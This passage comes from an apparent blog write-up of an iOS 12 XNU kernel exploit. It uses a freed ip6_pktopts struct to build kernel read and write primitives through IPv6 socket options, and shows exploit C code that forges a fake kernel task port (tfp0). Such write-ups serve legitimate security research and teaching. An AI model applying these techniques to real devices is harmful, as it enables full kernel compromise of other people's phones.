		optdatalen = sizeof (int);
		break;

	case IPV6_DONTFRAG:
		if (pktopt && ((pktopt->ip6po_flags) & IP6PO_DONTFRAG))
			on = 1;
		else
			on = 0;
		optdata = (void *)&on;
		optdatalen = sizeof (on);
		break;

	case IPV6_PREFER_TEMPADDR:
		if (pktopt)
			optdata = (void *)&pktopt->ip6po_prefer_tempaddr;
		else
			optdata = (void *)&defpreftemp;
		optdatalen = sizeof (int);
		break;

	default:		/* should not happen */
#ifdef DIAGNOSTIC
		panic("ip6_getpcbopt: unexpected option\n");
#endif
		return (ENOPROTOOPT);
	}

	return (sooptcopyout(sopt, optdata, optdatalen));
}
```
<sup>*[xnu-4903.221.2/bsd/netinet6/ip6_output.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/ip6_output.c#L3126)*</sup>

Right off the bat we can eliminate `IPV6_DONTFRAG`. It will ever only give us back a `0` or a `1`, which is useless. 

`IPV6_TCLASS`, `IPV6_USE_MIN_MTU`, and `IPV6_PREFER_TEMPADDR` are also useless. In each of those cases, the code assigns `optdata` to the address of `pktopt->ip6po_tclass`, `pktopt->ip6po_minmtu`, and `pktopt->ip6po_prefer_tempaddr`, respectively. `pktopt` is the reallocated `ip6_pktopts` struct inside our pipe buffer. Since we cannot change the address of where our pipe buffer is allocated, we won't be able to control `optdata`, which will be the `kaddr` argument to `copyout`. If that isn't immediately clear, perhaps looking at some assembly will help. I'll use `IPV6_USE_MIN_MTU` for this example. This code `optdata = (void *)&pktopt->ip6po_minmtu;` and the following call to `copyout` would look something like this in assembly:

```
LDR X0, [<Rn>, #<imm>]        ; assume Rn+imm points to the address of the pktopt parameter
ADD X0, X0, #<imm>            ; assume imm is the offset of the ip6po_minmtu field
                              ; and add it to the address of pktopt to get the address of
                              ; pktopt->ip6po_minmtu
                              ; X0 = &pktopt->ip6po_minmtu (optdata, aka kaddr)
LDR X1, [<Rn>, #<imm>]        ; assume Rn = the sopt parameter,
                              ; and imm is the offset of the sopt_val field
                              ; X1 = sopt->sopt_val (uaddr)
MOV W2, #4                    ; W2 = sizeof(int) (optdatalen, aka len)
BL copyout
```
     
We cannot control `X0`, or `kaddr`. If we *had* control over `X0`, we'd be able to trick the kernel into copying out four bytes of its own memory.

Let's take a look at `IPV6_HOPOPTS`. For this option, the code assigns `optdata` to `pktopt->ip6po_nexthop`. The plus side here is `optdata` will no longer hold a value based on the address of our pipe buffer. Instead, it gets assigned to a pointer we control, granting us complete reign over `copyout`'s `kaddr` argument. But there's a problem: `optdatalen`, the `len` argument to `copyout`, is determined by a field of a struct pointed to by `optdata`. That field is `pktopt->ip6po_nexthop->sa_len`. Imagine we just built an arbitrary kernel read out of `IPV6_NEXTHOP`. We write our `kaddr` to `ip6po_nexthop`, which is really a [macro](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/ip6_var.h#L205) for `ip6po_nhinfo.ip6po_nhi_nexthop`, in our controlled `pktopts` struct and call `getsockopt` with `evil_socket` and `IPV6_NEXTHOP`. We hit this code:

```
optdata = (void *)pktopt->ip6po_nexthop;
optdatalen = pktopt->ip6po_nexthop->sa_len;
```

After the kernel places our controlled pointer into `optdata`, it tries to read the `sa_len` field from what should be a pointer to a `sockaddr` struct, but is instead a pointer to whatever kernel memory we're trying to read. In assembly, those two lines of code, followed by the `copyout` call, would look something like this:

```
LDR X0, [<Rn>, #<imm>]        ; assume Rn = the pktopt parameter and imm is the offset of
                              ; the ip6po_nhinfo.ip6po_nhi_nexthop field
                              ; X0 = pktopt->ip6po_nhinfo.ip6po_nhi_nexthop (optdata, aka kaddr)
LDR X1, [<Rn>, #<imm>]        ; assume Rn = the sopt parameter and imm is the offset of
                              ; the sopt_val field
                              ; X1 = sopt->sopt_val (uaddr)
LDRB W2, [X0]                 ; W2 = *(uint8_t *)X0 (optdatalen, aka len)
BL copyout
```

`struct sockaddr` looks like this:

```
struct sockaddr {
	__uint8_t	sa_len;		/* total length */
	sa_family_t	sa_family;	/* [XSI] address family */
	char		sa_data[14];	/* [XSI] addr value (actually larger) */
};
```
<sup>*[xnu-4903.221.2/bsd/sys/socket.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/sys/socket.h#L591)*</sup>

The `sa_len` field is the first member of the struct, which is why we don't add an immediate to `X0` when dereferencing `pktopt->ip6po_nhinfo.ip6po_nhi_nexthop`.

If you haven't spotted the issue yet, perhaps this will help. Say we are trying to read an 8 byte pointer from `kaddr`, and the memory at `kaddr` happens to look like this:

```
kaddr: 01 60 82 1c e0 ff ff ff 01 00 43 07 00 00 00 00
```

Take a look at the above assembly again. The kernel puts `pktopt->ip6po_nhinfo.ip6po_nhi_nexthop`, the `kaddr` parameter, into `X0`, which is fine. Then it puts `sopt->sopt_val`, the `uaddr` parameter, into `X1`, which is also fine. Then the kernel dereferences `kaddr` and sticks the least significant byte of whatever `kaddr` points to into `W2`, which is the `len` parameter to `copyout`. iOS devices are little endian machines, so the least significant byte is stored first with the rest of the data following it. What is the least significant byte here? It's `0x01`, so `optdatalen` will end up being `1`, which is seven bytes short of what we needed to read out the entire kernel pointer. If we used `IPV6_NEXTHOP` with `getsockopt` to read kernel memory, we would have to rely on the least significant byte of each piece of data we plan on reading from the kernel being greater than or equal to the size of each piece of said data. So a four byte read would require the least significant byte of those four bytes to be `>= 4` and an eight byte read would require the least significant byte of those eight bytes to be `>= 8`. Leaving the success of a kernel read to sheer luck kills reliability. We're already past the risky reallocation part of the exploit, so nuking reliability again here isn't ideal. `IPV6_HOPOPTS` is useless.

For the options `IPV6_HOPOPTS`, `IPV6_RTHDR`, `IPV6_RTHDRDSTOPTS`, and `IPV6_DSTOPTS`, we can still control `kaddr` because `optdata` gets a pointer assigned to it, but `optdatalen` still depends on the data pointed to by `optdata`. The only difference with these options and `IPV6_HOPOPTS` is the way `optdatalen` gets calculated. It depends on `pktopt->ip6po_<n>->ip6e_len`, so instead of using the least significant byte of what `kaddr` points to, the byte *after* the least significant byte is used. Here is `struct ip6_ext`:

```
struct	ip6_ext {
	u_int8_t ip6e_nxt;
	u_int8_t ip6e_len;
} __attribute__((__packed__));
```
<sup>*[xnu-4903.221.2/bsd/netinet/ip6.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet/ip6.h#L154)*</sup>

The reason the byte after the least significant byte is used is because the offset of `ip6e_len` is `1`, not `0`. To calculate `optdatalen` those four options all use the same code:

```
optdatalen = (ip6e->ip6e_len + 1) << 3;
```

Since `ip6e_len` is one byte, we can easily find the maximum and minimum values for `ip6e_len` that produce good values for `optdatalen`. If the byte after the least significant byte ends up being `0xff`, `optdatalen` will be `0x800`, because `(0xff + 1) << 3 == 0x800`. If that byte is `0`, `optdatalen` will be `0x8`, because `(0 + 1) << 3 == 0x8`. This is actually great for us because there's no scenario where `optdatalen` could end up being less than eight. My only issue with this is we'll start reading huge chunks of kernel memory as that byte approaches the higher end, so there is the slight chance of hitting an unmapped region of memory, triggering a panic. Any four of these options would work for reading kernel memory, but we still have one more option to look at.

In a sea of annoying variations for `optdatalen`, we have one option that breaks the status quo: `IPV6_PKTINFO` (code simplified):

```
optdata = (void *)pktopt->ip6po_pktinfo;
optdatalen = sizeof (struct in6_pktinfo);
```

Again, since `optdata` gets assigned to `pktopt->ip6po_pktinfo`, a pointer that we control, we control `copyout`'s `kaddr` argument. `pktopt->ip6po_pktinfo` would normally point to an `in6_pktinfo` struct. `optdatalen` is simply assigned to `sizeof(struct in6_pktinfo)`. On an iPhone SE running iOS 12, `sizeof(struct in6_pktinfo)` yields 20. This is what the assembly of the code above, followed by the call to `copyout`, would look like:

```
LDR X0, [<Rn>, #<imm>]        ; assume Rn = the pktopt parameter and imm is the offset of
                              ; the ip6po_pktinfo field
                              ; X0 = pktopt->ip6po_pktinfo (optdata, aka kaddr)
LDR X1, [<Rn>, #<imm>]        ; assume Rn = the sopt parameter and imm is the offset of
                              ; the sopt_val field
                              ; X1 = sopt->sopt_val (uaddr)
MOV W2, #0x14                 ; W2 = sizeof(struct in6_pktinfo) (optdatalen, aka len)
BL copyout
```

We can control `X0`, the `kaddr` argument to `copyout`, and `W2`, the `len` parameter to `copyout`, is simply 20! This is so much better than reading an unknown amount of kernel memory with the previous four options we were looking at. After a long time, we can finally get the kernel to copy out its memory with this code:

```
/* read out the old ip6_pktopts struct, update
 * it for the kernel read, then shove it back
 * into our evil pipe
 */
struct ip6_pktopts old_pktopts = {0};
read(evil_pipe[0], &old_pktopts, sizeof(old_pktopts));

struct ip6_pktopts new_pktopts = {0};
new_pktopts.ip6po_pktinfo = kaddr;

write(evil_pipe[1], &new_pktopts, sizeof(new_pktopts));
    
struct in6_pktinfo info = {0};
socklen_t infosz = sizeof(info);

getsockopt(evil_socket, IPPROTO_IPV6, IPV6_PKTINFO, &info, &infosz);
```

After the call to `getsockopt`, `info` will contain 20 bytes of kernel memory, starting from `kaddr`. To me, reading 20 bytes at once is weird, so I only use the first eight bytes by saving `*(uint64_t *)&info` into another variable.

Now that we have a way to read arbitrary kernel memory, we're able to check if `leaked_port`s `ip_context` field is equal to `0x1122334455667788`, and if it is, we can start gathering the pointers we need for a fake tfp0. 

### Pointer hunting

Creating a fake kernel task port is a piece of cake. We need three pointers: the kernel's `ipc_space`, the kernel's `vm_map`, and a pointer to where a fake kernel task will reside. I'll explain more about the fake kernel task when we get to it.

#### Kernel's `ipc_space` struct

Since this is the first pointer we're going to find, we need to perform a bit of extra work. We need to find our `task` structure in kernel memory in order to pull off a trick later that I learned from reading [Siguza's](https://twitter.com/s1guza) [v0rtex](https://siguza.github.io/v0rtex/) writeup. Since we have the address of `leaked_port`, it will be easy. Every Mach port has a `receiver` field that keeps track of Mach messages that haven't been received yet. `receiver` is an `ipc_space` struct, and that struct has a pointer to the owning `task` structure. This would look something like `uint64_t mytask_kaddr = leaked_port->data.receiver->is_task;`, but obviously it can't be done that way because we are not in the kernel's address space. It has to be done this way:

```
uint64_t myipcspace_kaddr = 0;
EarlyKernelRead64(leaked_port_kaddr + offsetof(kport_t, ip_receiver), &myipcspace_kaddr);

uint64_t mytask_kaddr = 0;
EarlyKernelRead64(myipcspace_kaddr + offsetof(struct ipc_space, is_task), &mytask_kaddr);
```

The `EarlyKernelRead*` family of functions piggyback off the 20 byte kernel read we can do with `getsockopt`.

Now that we've got the address of our `task` struct, we can perform the trick I mentioned earlier. The `task` structure has this field:

```
struct ipc_port *itk_registered[TASK_PORT_REGISTER_MAX];
```
<sup>*[xnu-4903.221.2/osfmk/kern/task.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/osfmk/kern/task.h#L207)*</sup>

In `xnu-4903.221.2`, `TASK_PORT_REGISTER_MAX` is a [macro](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/osfmk/mach/mach_param.h#L71) that expands to `3`. We can write to this array with `mach_ports_register` and read from it with `mach_ports_lookup`. And since we already have the address of our `task` struct, we can leak the address of any port we stash in that array. What we're going to do is create an `IOSurface` client, which is a Mach port name in userland, and register it with `mach_ports_register`. Then we'll leak the address of that port by reading `ourtask->itk_registered[0]`. Since that port was created by the kernel, the `receiver` field will be the kernel's `ipc_space` struct, so we finally have the first of the three pointers we need.

A tiny side note: it's entirely possible to determine the kernel base and derive the kernel slide at this point. Since the `IOSurface` client represents a C++ object, its `kdata.kobject` field of is underlying `ipc_port` will point to a C++ object. If we read the `kdata.kobject` field and dereference it with another call to `EarlyKernelRead64`, we'll end up with a pointer to the first function of that C++ object's vtable. Whatever that function is doesn't matter, the only thing that matters is it will lie inside of the `__text` section of the `__TEXT_EXEC` segment. From there we can walk back until we see `feedfacf`, the 64 bit mach-o magic, to get the kernel base. For the kernel slide, we subtract the kernel base we got from walking back with `0xfffffff007004000`. Having the kernel base/slide isn't necessary for *just* making a fake kernel task port, but I thought I'd cover it anyway. Even if it serves no purpose for this exploit, it's cool to have.

#### Kernel's `vm_map` struct

The second pointer we need is the kernel's `vm_map` structure. `vm_map` is another field in the `task` structure. Since we only have our `task` struct, we need to find the kernel's `task` struct. For some reason, `is_task` in the kernel's `ipc_space` struct is `NULL`, so we can't use that. Fortunately for us, the `task` struct has a field, `bsd_info`, that points to the corresponding `proc` struct. We can get the address of our `proc` struct by doing this:

```
uint64_t myproc_kaddr = 0;
EarlyKernelRead64(mytask_kaddr + TASK_BSDINFO_OFFSET, &myproc_kaddr);
```

`struct proc` implements a doubly linked list at the beginning of the structure:

```
struct	proc {
	LIST_ENTRY(proc) p_list;		/* List of all processes. */
	void * 		task;			/* corresponding task (static)*/
	struct	proc *	p_pptr;		 	/* Pointer to parent process.(LL) */
	pid_t		p_ppid;			/* process's parent pid number */
	pid_t		p_pgrpid;		/* process group id of the process (LL)*/
	uid_t		p_uid;
	gid_t		p_gid;
	uid_t		p_ruid;
	gid_t		p_rgid;
	uid_t		p_svuid;
	gid_t		p_svgid;
	uint64_t	p_uniqueid;		/* process unique ID - incremented on fork/spawn/vfork, remains same across exec. */
	uint64_t	p_puniqueid;		/* parent's unique ID - set on fork/spawn/vfork, doesn't change if reparented. */
	lck_mtx_t 	p_mlock;		/* mutex lock for proc */
	pid_t		p_pid;			/* Process identifier. (static)*/
	
	...
};
```
<sup>*[xnu-4903.221.2/bsd/sys/proc_internal.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/sys/proc_internal.h#L194)*</sup>

`LIST_ENTRY(proc) p_list;` is a [macro](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/sys/queue.h#L436) that expands to this:

```
struct {
	struct proc *le_next;	/* next element */
	struct proc **le_prev;	/* address of previous next element */
} p_list;
```

We're able to iterate through all the `proc` structs in the system by reading these pointers. All we have to do to find the kernel's `proc` struct is to loop backward through the list of processes. Interestingly enough, we don't touch `le_prev` to do this, we read `le_next`. Yes, it's counterintuitive, but if it works, it works. For every `proc` struct we encounter, we'll read its `p_pid` field to check if it's `0`. If it is, we found the kernel's `proc` struct. Here's the code to do that:

```
uint64_t kernproc_kaddr = 0;
uint64_t curproc = myproc_kaddr;

for(;;){
    uint32_t pid = -1;
    EarlyKernelRead32(curproc + PROC_PID_OFFSET, &pid);

    if(pid == 0){
        kernproc_kaddr = curproc;
        break;
    }

    EarlyKernelRead64(curproc, &curproc);
}
```

Now that we've got the kernel's `proc` struct, we can read its `task` field for the kernel's `task` struct. Finally, from there, we can get a pointer to the kernel's `vm_map`. Two pointers down, one to go.

#### Fake kernel task

After iOS 10.3, Apple started to check against the real kernel task pointer, so we can't hook `kerntask_kaddr` up to our fake kernel task port. Instead, we can make our own with a pipe buffer:

```
int taskpipe[2];
pipe(taskpipe);

ktask_t faketask = {0};
faketask.lock.type = 0x22;
faketask.ref_count = 100;
faketask.active = 1;
faketask.map = kern_vmmap_kaddr;

write(taskpipe[1], &FAKE_TASK_PIPE_MAGIC, sizeof(FAKE_TASK_PIPE_MAGIC));
write(taskpipe[1], &faketask, sizeof(faketask));
```

`FAKE_TASK_PIPE_MAGIC` is a magic number that will come in handy later. This is where the kernel's `vm_map` comes into play. The nastiest bug I ran into while developing this exploit had to do with this fake kernel task. That `ktask_t` structure is only 40 bytes. It includes all the fields of `struct task` up to and including `map` because we don't need to mess with anything after `map`. The real `task` structure is way larger than that. After I get tfp0 I test it by granting myself root, then restoring my original UID, GID, etc. That test would fail around 50% of the time, and it felt completely random. The pipe buffer is a normal `kalloc` allocation, so the parts of that buffer I don't use, including the rest of the fake `task` struct, is initialized with whatever was there before. I forgot to zero out the remainder of the fake task pipe buffer! I don't know what `sizeof(struct task)` is, but it shouldn't be more than `0x900` bytes:

```
char zerobuf[0x900] = {0};
write(taskpipe[1], zerobuf, sizeof(zerobuf));
```

After I did that, my tfp0 worked 100% of the time. Now we have to find where the address of fake task pipe buffer. This will be easy, as we already have the address of our `proc` struct. To find the list of files for our process, we read the `p_fd` field of our `proc` struct. `p_fd` is a `filedesc` struct. `struct filedesc` contains a dynamic array of open files, the `fd_ofiles` field, and the number of open files, the `fd_nfiles` field. We can iterate through that array, check if the current file is a pipe, and if it is, store its address. Since the address will be a pointer to a `pipe` struct, we can read the first eight bytes of its pipe buffer, and if those eight bytes are equal to `FAKE_TASK_PIPE_MAGIC`, we've found the pipe buffer that holds our fake kernel task. We'll actually add `sizeof(FAKE_TASK_PIPE_MAGIC)` to the address of the pipe buffer for the address of our fake kernel task.

We've got the three pointers we need, so what's next? We still need to build our fake kernel task port. We won't do that yet, however, for reasons that will become clear later.

### Building an arbitrary kernel write

We are able to write to our freed struct with `setsockopt`. `setsockopt` takes similar options as `getsockopt`, so we can quickly run through them to figure out what won't work. We can eliminate `IPV6_HOPLIMIT`, `IPV6_TCLASS`, `IPV6_USE_MIN_MTU`, `IPV6_DONTFRAG`, and `IPV6_PREFER_TEMPADDR` because like before, we cannot change the address of where our pipe buffer is. Those five options don't deal with a pointer we can control. `IPV6_NEXTHOP`, `IPV6_HOPOPTS`, 	`IPV6_DSTOPTS`, and `IPV6_RTHDRDSTOPTS` do deal with a pointer we can control, but have permissions checks that will cause `setsockopt` to return `EACCES`. `IPV6_RTHDR` doesn't have a permission check, and we can control `opt->ip6po_rthdr`, but once we get past all the parameter validation, the kernel allocates new memory and assigns it to `opt->ip6po_rthdr`, which completely overwrites our controlled pointer. The last option is `IPV6_PKTINFO`, so let's check it out (comments omitted to shorten the code):

```
case IPV6_PKTINFO: {
		struct ifnet *ifp = NULL;
		struct in6_pktinfo *pktinfo;

		if (len != sizeof (struct in6_pktinfo))
			return (EINVAL);

		pktinfo = (struct in6_pktinfo *)(void *)buf;

		if (optname == IPV6_PKTINFO && opt->ip6po_pktinfo &&
		    pktinfo->ipi6_ifindex == 0 &&
		    IN6_IS_ADDR_UNSPECIFIED(&pktinfo->ipi6_addr)) {
			ip6_clearpktopts(opt, optname);
			break;
		}

		if (uproto == IPPROTO_TCP && optname == IPV6_PKTINFO &&
		    sticky && !IN6_IS_ADDR_UNSPECIFIED(&pktinfo->ipi6_addr)) {
			return (EINVAL);
		}

		ifnet_head_lock_shared();

		if (pktinfo->ipi6_ifindex > if_index) {
			ifnet_head_done();
			return (ENXIO);
		}

		if (pktinfo->ipi6_ifindex) {
			ifp = ifindex2ifnet[pktinfo->ipi6_ifindex];
			if (ifp == NULL) {
				ifnet_head_done();
				return (ENXIO);
			}
		}

		ifnet_head_done();

		if (opt->ip6po_pktinfo == NULL) {
			opt->ip6po_pktinfo = _MALLOC(sizeof (*pktinfo),
			    M_IP6OPT, M_NOWAIT);
			if (opt->ip6po_pktinfo == NULL)
				return (ENOBUFS);
		}
		bcopy(pktinfo, opt->ip6po_pktinfo, sizeof (*pktinfo));
		break;
}
```
<sup>*[xnu-4903.221.2/bsd/netinet6/ip6_output.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/ip6_output.c#L3613)*</sup>

After a ton of input validation, we hit a 20 byte `bcopy` with `opt->pktinfo`, which is a pointer we control. To take the codepath where we hit the `bcopy`, we need to contruct our `in6_pktinfo` struct so we get past all the input checks. This is `struct in6_pktinfo`:

```
struct in6_pktinfo {
	struct in6_addr	ipi6_addr;	/* src/dst IPv6 address */
	unsigned int	ipi6_ifindex;	/* send/recv interface index */
};
```
<sup>*[xnu-4903.221.2/bsd/netinet6/in6.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/in6.h#L709)*</sup>

And this is `struct in6_addr`:

```
typedef struct in6_addr {
	union {
		__uint8_t   __u6_addr8[16];
		__uint16_t  __u6_addr16[8];
		__uint32_t  __u6_addr32[4];
	} __u6_addr;			/* 128-bit IP6 address */
} in6_addr_t;
```
<sup>*[xnu-4903.221.2/bsd/netinet6/in6.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/in6.h#L151)*</sup>

Let's examine each `if` statement to see our constraints.

```
if (len != sizeof (struct in6_pktinfo))
	return (EINVAL);
```

No issue there, the `optlen` parameter given to `setsockopt` will be `sizeof(struct in6_pktinfo)`.

```
if (optname == IPV6_PKTINFO && opt->ip6po_pktinfo &&
		pktinfo->ipi6_ifindex == 0 &&
		IN6_IS_ADDR_UNSPECIFIED(&pktinfo->ipi6_addr)) {
		ip6_clearpktopts(opt, optname);
		break;
}
```

`optname` will be `IPV6_PKTINFO`, and `opt->ip6po_pktinfo`, our controlled pointer, will not be `NULL`. If we want this check to fail, we'll simply set `pktinfo->ipi6_ifindex` to a nonzero value.

```
if (uproto == IPPROTO_TCP && optname == IPV6_PKTINFO &&
        sticky && !IN6_IS_ADDR_UNSPECIFIED(&pktinfo->ipi6_addr)) {
        return (EINVAL);
}
```

`evil_socket` is a TCP socket, so `uproto` will be `IPPROTO_TCP`, and `optname` will be `IPV6_PKTINFO`. `sticky` is a parameter to `ip6_setpktopt` that will be `1`. It was passed by value inside of `ip6_pcbopt`, which calls `ip6_setpktopt`. The last condition, `!IN6_IS_ADDR_UNSPECIFIED(&pktinfo->ipi6_addr)`, is what will determine if we bail with `EINVAL` or not. `IN6_IS_ADDR_UNSPECIFIED` is a macro which expands to this:

```
#define	IN6_IS_ADDR_UNSPECIFIED(a)	\
	((*(const __uint32_t *)(const void *)(&(a)->s6_addr[0]) == 0) && \
	(*(const __uint32_t *)(const void *)(&(a)->s6_addr[4]) == 0) && \
	(*(const __uint32_t *)(const void *)(&(a)->s6_addr[8]) == 0) && \
	(*(const __uint32_t *)(const void *)(&(a)->s6_addr[12]) == 0))
```
<sup>*[xnu-4903.221.2/bsd/netinet6/in6.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/in6.h#L312)*</sup>

`s6_addr` is yet another [macro](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/in6.h#L159) that expands to `__u6_addr.__u6_addr8`. It's a lot of pointer insanity but it's much simplier than it looks. See those `__uint32_t` casts? That macro inteprets the bits at the address of every fourth byte of the `in6_addr` struct as a 32 bit unsigned integer, then checks if said integer is equal to zero. So in order for the check `!IN6_IS_ADDR_UNSPECIFIED(&pktinfo->ipi6_addr)` to fail, we need to zero out the `ipi6_addr` member of the `in6_pktinfo` struct we pass to `setsockopt`.

```
if (pktinfo->ipi6_ifindex > if_index) {
        ifnet_head_done();
        return (ENXIO);
}
```

`if_index` was incredibly annoying to track down. Turns out it's a `sysctl` variable representing the number of configured interfaces on the device. I'll save you the pain of [tracking it down yourself](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/net/if_mib.c#L98). I could not for the life of me figure out what this variable was initialized with, so I just brute forced nonzero values for the `ipi6_ifindex` field to see when `setsockopt` would return `ENXIO`. Turns out the phone I was developing this exploit with has 15 configured interfaces. To get past this check, the `ipi6_index` field of the `in6_pktinfo` struct needs a value from 1-15, inclusive.

```
if (pktinfo->ipi6_ifindex) {
        ifp = ifindex2ifnet[pktinfo->ipi6_ifindex];
        if (ifp == NULL) {
            ifnet_head_done();
            return (ENXIO);
        }
}
```

Since the `ipi6_ifindex` field is nonzero, we enter this `if` statement, but `ifp` never ended up being `NULL` for the range of values I described earlier.

```
if (opt->ip6po_pktinfo == NULL) {
        opt->ip6po_pktinfo = _MALLOC(sizeof (*pktinfo),
           M_IP6OPT, M_NOWAIT);
        if (opt->ip6po_pktinfo == NULL)
            return (ENOBUFS);
}
```

This checks if our controlled pointer is `NULL`, and it won't ever be.

Finally we hit that `bcopy`, where we can write to a controlled address in the kernel.

### Creating a fake kernel task port

Things are looking bleak. Out of the 20 bytes our `in6_pktinfo` struct is comprised of, 19 of them must be zero. The only byte we have a bit of freedom with is the least significant byte of the `ipi6_ifindex` field, which must be anything from 1 to 15. For a day I was really annoyed with this. I was so close to finishing it but I felt finished off by Apple. But then I remembered something: ARMv8 requires that instructions are word aligned (a word in ARMv8 is 32 bits), so shouldn't the concept of alignment apply to data as well? The ARMv8 reference manual states:
> For all instructions that load or store single or multiple registers, but not Load-Exclusive, Store-Exclusive, Load-Acquire/Store-Release and Atomic instructions, if the address that is accessed is not aligned to the size of the data element being accessed, then:
> 
> When the value of SCTLR_ELx.A applicable to the current Exception level is 1, an Alignment fault is generated.

By that logic, if a four byte integer were to be loaded from a register, that register must hold a word aligned pointer to that integer, and if an eight byte pointer were to be loaded from a register, that register must hold a doubleword aligned pointer to that pointer. If something is word aligned, that means its bottom two bits are zero'ed out. If something is doubleword aligned, that means its bottom three bits are zero'ed out. Let's go a bit further than this. Through experimentation I noticed that page sized pipe buffer allocations are page aligned. It sounds obvious, but at the time I wasn't considering alignments larger than 128 bits (quadword). The page size of the phone I was developing this exploit on is `0x4000`. In my case, if a pointer is page aligned, at the very least its bottom 14 bits will always be zero'ed out. This is where being able to write a bunch of zeros will come in handy. If we get a pointer to a Mach port and a pointer to a page aligned pipe buffer with the same upper 48 bits, we can use our kernel write to zero out the bottom 16 bits of the Mach port pointer to instead make it point to a controlled pipe buffer. But why do the upper 48 bits have to match instead of the upper 50? I did say that a page aligned allocation will have its bottom 14 bits zeroed out, but with the crappy kernel write primitive we have, it's much easier to write two bytes worth of zeros instead of one zero byte and whatever the next byte would be with its bottom six bits zero'ed out.

This is why we didn't create the pipe to hold our fake kernel task port yet. In order to increase our chances of getting a pipe buffer and Mach port pointer with the same upper 48 bits, we're going to alternate allocating them. We'll create 250 each, making each pipe buffer a `kalloc.16384` (`16384` == `0x4000`) allocation and granting each Mach port a send right for `mach_ports_register` later. The Mach ports will be held in an array called `colliderports` and the pipes in an array called `colliderpipes`. For each pipe buffer, we'll append a short "header". At `pipe buffer + 0`, we'll write the device's page size, and at `pipe buffer + 4`, we'll write the index of where it resides in the `colliderpipes` array. After, we'll loop through each Mach port, register it, read `mytask_kaddr->itk_registered[0]` for its pointer, then loop through each pipe buffer pointer and check if the upper 48 bits are identical for both. If they are, we've found our `tfp0pipe` and soon to be `tfp0` port. If they aren't, we unregister the current Mach port and go again.

Now that we have our `tfp0pipe`, we can shove a fake kernel task port into its pipe buffer. But first we need to read out the crap that was shoved in it before to make it a page sized `kalloc` allocation:

```
kport_t ktfp0 = {0};
ktfp0.ip_bits = io_makebits(1, IOT_PORT, IKOT_TASK);
ktfp0.ip_references = 100;
ktfp0.ip_lock.type = 0x11;
ktfp0.ip_receiver = kern_ipc_space_kaddr;
ktfp0.ip_kobject = faketask_kaddr;
ktfp0.ip_srights = 99;

/* get rid of the stuff we sent to the pipe to create the initial pipe buffer... */
char junkbuf[colliderkzone - 1];
read(tfp0pipe[0], junkbuf, sizeof(junkbuf));

/* ...and replace it with our fake tfp0 */
write(tfp0pipe[1], &ktfp0, sizeof(ktfp0));
```

The only thing left to do is make our userland `tfp0` port actually point to the `tfp0pipe` pipe buffer. Let's step back for a moment and think about how the number that represents the `tfp0` port in userland is used in the kernel. A Mach port name in userland is made up of two parts: a generation number and an index. The generation number isn't important to us, but the index is. That index represents a spot in the table of our processes' Mach ports in kernel space. The index is bits 8 to 31, so we can figure out where our userland `tfp0` sits in our Mach port table by shifting `tfp0` to the right by eight bits. To access our table, we can read the `is_table` field of our `ipc_space` struct. The `is_table` is an array of `struct ipc_entry`, which looks like this:

```
struct ipc_entry {
	struct ipc_object *ie_object;
	ipc_entry_bits_t ie_bits;
	mach_port_index_t ie_index;
	union {
		mach_port_index_t next;		/* next in freelist, or...  */
		ipc_table_index_t request;	/* dead name request notify */
	} index;
};
```
<sup>*[xnu-4903.221.2/osfmk/kern/ipc_entry.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/osfmk/ipc/ipc_entry.h#L97)*</sup>

The `ie_object` field is a pointer to the associated Mach port. Getting the `ipc_entry` struct for our userland `tfp0` port is a piece of cake:

```
uint32_t tfp0_portidx = tfp0 >> 8;
tfp0_portidx *= sizeof(struct ipc_entry);

uint64_t baseaddr = myipcspace.is_table + tfp0_portidx;
```

`baseaddr` is the address of `tfp0`'s `ie_object`. In order to set up this write correctly, we subtract 18 from `baseaddr` because we're only using the last two bytes of an `in6_pktinfo` struct to zero `ie_object`'s bottom 16 bits out. But because of that, we're going to obliterate the 18 bytes of memory before this pointer. This isn't much of an issue; we'll just save those 18 bytes before the write. We set the `ip6po_pktinfo` field of our reallocated `ip6_pktopts` struct to `baseaddr`, call `setsockopt` with `evil_socket`, `IPV6_PKTINFO`, and our crafted `in6_pktinfo` struct, and after `setsockopt` returns, `tfp0` is a fully functional, but fake, kernel task port! The only thing left to do is restore the 18 bytes we saved before the write, which we can easily do with a call to `vm_write`.

You can find the complete code for the exploit [here](https://github.com/jsherman212/used_sock).

## Final Thoughts

I believe the real reason I did not get into iOS exploit dev earlier is because I was afraid of failing. Repeatedly getting "sucked back into the debugger" was an excuse to avoid pursuing what I am really interested in and passionate about. Exploitation used to be like black magic to me. Now it's more of "because I know how this aspect of iOS/XNU works, I can make the machine do what I want it to do". I can't wait to see what the coming years will bring.

If you would like a list of resources I used to learn to write my [first exploit](https://github.com/jsherman212/1032exploit), check out the README for that linked repository. What I learned from those resources served me well for this exploit.

If you have any questions, the best way of getting in touch with me is to contact me on [Twitter](https://twitter.com/jsherma100). I'm also on Discord, Justin#6010, but I rarely check it.
